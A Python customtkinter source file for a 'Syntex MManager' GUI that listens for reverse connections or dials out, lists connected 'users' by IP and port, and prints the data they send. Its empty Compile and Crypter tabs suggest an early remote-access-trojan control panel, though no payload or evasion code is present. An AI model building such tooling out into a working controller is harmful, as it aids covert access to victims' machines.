import time
import customtkinter as ck
import tkinter as tk
from tkinter import ttk
import socket as s
import os
import sys
import threading
from uuid import uuid4

APPARENCE = open('settings/apparence', mode='r').read()
COLOR_THEME = open('settings/color_theme', mode='r').read()
SOCKETS = {}
THREADS = {}
USERS = {}


class FrameTabConnections(ck.CTkFrame):
    def __init__(self, master):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)

        self.label_entry_type = ck.CTkLabel(self, text='Type')
        self.entry_type = ck.CTkOptionMenu(
            self,
            values=['reverse', 'normal']
        )

        self.label_entry_host = ck.CTkLabel(self, text='Host')
        self.entry_host = ck.CTkEntry(self)

        self.label_entry_port = ck.CTkLabel(self, text='Port')
        self.entry_port = ck.CTkEntry(self)

        self.label_entry_type.grid(column=0, row=0, padx=2, pady=10)
        self.entry_type.grid(column=1, row=0, padx=2, pady=10)
        self.label_entry_host.grid(column=2, row=0, padx=2, pady=10)
        self.entry_host.grid(column=3, row=0, padx=2, pady=10)
        self.label_entry_port.grid(column=4, row=0, padx=2, pady=10)
        self.entry_port.grid(column=5, row=0, padx=2, pady=10)


class FrameButtonConnections(ck.CTkFrame):
    def __init__(self, master, func):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)

        self.button_add_connection = ck.CTkButton(
            self,
            text='Add',
            command=func.add_connection
        )

        self.button_del_connection = ck.CTkButton(
            self,
            text='Del',
            command=func.del_connection
        )

        self.button_add_connection.grid(column=0, row=0, padx=2, pady=10)
        self.button_del_connection.grid(column=1, row=0, padx=2, pady=10)


class Application(ck.CTk):
    global APPARENCE
    global COLOR_THEME
    ck.set_appearance_mode(APPARENCE)
    ck.set_default_color_theme(COLOR_THEME)

    def __init__(self, title):
        super().__init__()

        # Setup
        w = 800
        h = 600
        x = (self.winfo_screenwidth() / 2) - (w / 2) + 100
        y = (self.winfo_screenheight() / 2) - (h / 2) - 30

        self.title_str = title
        self.title(self.title_str)
        self.iconbitmap(f'icons/{APPARENCE}-syntex.ico')
        self.geometry("%dx%d+%d+%d" % (w, h, x, y))
        self.grid_columnconfigure(0, weight=1)

        # Tabs
        self.tab_view = ck.CTkTabview(self)
        self.tab_view.pack(fill=ck.BOTH, expand=True)

        self.tab_settings = self.tab_view.add("Settings")
        self.tab_users = self.tab_view.add("Users")
        self.tab_connections = self.tab_view.add("Conections")
        self.tab_compile = self.tab_view.add("Compile")
        self.tab_crypter = self.tab_view.add("Crypter")

        # Tab Settings
        self.tab_view.label_apparence_mode = ck.CTkLabel(self.tab_settings, text=APPARENCE)
        self.tab_view.choice_apparence = ck.CTkSwitch(
            self.tab_settings, text="Apparence",
            onvalue="Light", offvalue="Dark",
            variable=ck.StringVar(value=APPARENCE),
            command=self.change_apparence
        )
        self.tab_view.label_apparence_mode.grid(column=0, row=0, padx=2)
        self.tab_view.choice_apparence.grid(column=1, row=0, padx=2)

        self.tab_view.label_color_theme = ck.CTkLabel(self.tab_settings, text=COLOR_THEME)
        self.tab_view.choise_color_theme = ck.CTkComboBox(
            self.tab_settings,
            values=['dark-blue', 'blue', 'green'],
            command=self.change_color_theme,
            variable=ck.StringVar(value=COLOR_THEME)
        )
        self.tab_view.label_need_restart = ck.CTkLabel(self.tab_settings, text="")

        self.tab_view.label_color_theme.grid(column=0, row=1, padx=2)
        self.tab_view.choise_color_theme.grid(column=1, row=1, padx=2, pady=10)
        self.tab_view.label_need_restart.grid(column=2, row=1, padx=2, pady=10)
        
        # Tab Users
        self.tab_view.label_users = ck.CTkLabel(self.tab_users, text="Users connected!")
        self.tab_view.label_users.pack()

        self.tab_view.list_users = ttk.Treeview(self.tab_users, columns=('id', 'ip', 'port', 'other'), show='headings')
        self.tab_view.list_users.heading('id', text='ID')
        self.tab_view.list_users.heading('ip', text='IP')
        self.tab_view.list_users.heading('port', text='PORT')
        self.tab_view.list_users.heading('other', text='OTHER')
        self.tab_view.list_users.pack(fill=ck.BOTH, expand=True)

        # Tab Connections

        self.tab_view.frame_connection = FrameTabConnections(self.tab_connections)
        self.tab_view.frame_connection.pack(padx=2, pady=5)

        self.tab_view.frame_button_connection = FrameButtonConnections(self.tab_connections, func=self)
        self.tab_view.frame_button_connection.pack(padx=2, pady=10)

        self.tab_view.list_connections = ttk.Treeview(self.tab_connections, columns=('type', 'HOST', 'port'), show='headings')
        self.tab_view.list_connections.heading('type', text='TYPE')
        self.tab_view.list_connections.heading('HOST', text='HOST')
        self.tab_view.list_connections.heading('port', text='PORT')
        self.tab_view.list_connections.pack(padx=2, pady=10, fill=ck.BOTH, expand=True)

    def __repr__(self):
        return f"App {self.title_str}"

    def change_apparence(self):
        global APPARENCE
        choice = self.tab_view.choice_apparence.get()
        with open('settings/apparence', 'w') as apparence_file:
            apparence_file.write(choice)
        self.tab_view.label_apparence_mode.configure(text=choice)
        self.iconbitmap(f'icons/{choice}-syntex.ico')
        ck.set_appearance_mode(choice)

    def change_color_theme(self, choice):
        global COLOR_THEME
        with open('settings/color_theme', 'w') as color_file:
            color_file.write(choice)
        if choice != COLOR_THEME:
            self.tab_view.label_need_restart.configure(text='NEED RESTART!')
        else:
            self.tab_view.label_need_restart.configure(text='')

    def del_connection(self):
        global THREADS, SOCKETS
        selected = self.tab_view.list_connections.selection()
        for record in selected:
            self.tab_view.list_connections.delete(record)
            try:
                SOCKETS[record].send(b'Disconnected by host')
                self.del_user(record, SOCKETS[record])
                thread, event = THREADS[record]
                event.set()
                thread.join(0.5)
            except KeyError:
                continue
            THREADS.pop(record)
            SOCKETS.pop(record)

    def add_user(self, id_thread, client, addr):
        global USERS
        try:
            client.send(b'Connected!\n')
        except OSError:
            pass
        USERS[id_thread] = client
        ip, port = addr
        info = f"connected on {client.getsockname()}"
        if id_thread not in self.tab_view.list_users.get_children():
            self.tab_view.list_users.insert('', ck.END, id=id_thread, values=(id_thread, ip, port, info))

    def del_user(self, id_thread, client):
        global USERS
        try:
            client.send(b'Disconnected!\n')
        except OSError as e:
            pass
        USERS.pop(id_thread, None)
        client.close()
        if id_thread in self.tab_view.list_users.get_children():
            self.tab_view.list_users.delete(id_thread)

    def add_connection(self):
        global THREADS
        e_type = self.tab_view.frame_connection.entry_type.get()
        e_host = self.tab_view.frame_connection.entry_host.get()
        e_port = self.tab_view.frame_connection.entry_port.get()

        self.tab_view.frame_connection.entry_host.delete(0, ck.END)
        self.tab_view.frame_connection.entry_port.delete(0, ck.END)

        try:
            int(e_port)
        except ValueError:
            return

        i_type = 1 if e_type == 'reverse' else 0
        i_host = "0.0.0.0" if not e_host else e_host
        i_port = int(e_port)

        # connection = (i_type, i_port, e_host)
        # CONNECTIONS.append(connection)
        def handle_t1(skt, id_t, evt):
            try:
                children = self.tab_view.list_connections.get_children()
            except RuntimeError:
                return
            while id_t in children and not evt.is_set():
                try:
                    c, a = skt.accept()
                except OSError:
                    break

                self.add_user(id_t, c, a)
                while True:
                    if evt.is_set():
                        break
                    try:
                        data = c.recv(1024)
                        print(data.decode())
                    except ConnectionResetError:
                        self.del_user(id_t, c)
                        break
                    except Exception as e:
                        print(e)
                        break
            self.del_user(id_t, skt)

        def handle_t2(id_t, evt):
            try:
                children = self.tab_view.list_connections.get_children()
            except RuntimeError:
                return
            while id_t in children and not evt.is_set():
                skt = s.socket(s.AF_INET, s.SOCK_STREAM)
                SOCKETS[id_thread] = skt
                try:
                    skt.connect((i_host, i_port))
                except (OSError, OverflowError):
                    time.sleep(1)
                    pass
                else:
                    self.add_user(id_t, skt, (e_host, i_port))
                    while True:
                        if evt.is_set():
                            break
                        try:
                            data = skt.recv(1024)
                            print(data.decode())
                        except ConnectionResetError:
                            self.del_user(id_t, skt)
                            break
                        except Exception as e:
                            print(e)
                            break
                self.del_user(id_t, skt)

        socket = s.socket(s.AF_INET, s.SOCK_STREAM)
        if i_type == 1:
            try:
                socket.bind((i_host, i_port))
                socket.listen(1)
            except (OSError, OverflowError):
                pass
            else:
                id_thread = str(uuid4())
                event = threading.Event()
                thread = threading.Thread(target=handle_t1, args=(socket, id_thread, event))
                thread.start()

                SOCKETS[id_thread] = socket
                THREADS[id_thread] = [thread, event]

                self.tab_view.list_connections.insert('', ck.END, id=id_thread, values=(e_type, e_host, e_port))
        elif i_type == 0 and i_host != "0.0.0.0":
            id_thread = str(uuid4())
            event = threading.Event()
            thread = threading.Thread(target=handle_t2, args=(id_thread, event))
            thread.start()

            THREADS[id_thread] = [thread, event]

            self.tab_view.list_connections.insert('', ck.END, id=id_thread, values=(e_type, e_host, e_port))


if __name__ == '__main__':
    app = Application("Syntex MManager")

    def on_close():
        global THREADS, SOCKETS, USERS
        for id, (thread, event) in THREADS.items():
            event.set()
            thread.join(0.1)
        for key, socket in SOCKETS.items():
            try:
                socket.close()
            except OSError:
                continue
        for key, client in USERS.items():
            try:
                client.close()
            except OSError:
                continue
        THREADS = {}
        SOCKETS = {}
        USERS = {}
        app.destroy()

    app.protocol("WM_DELETE_WINDOW", on_close)
    app.mainloop()
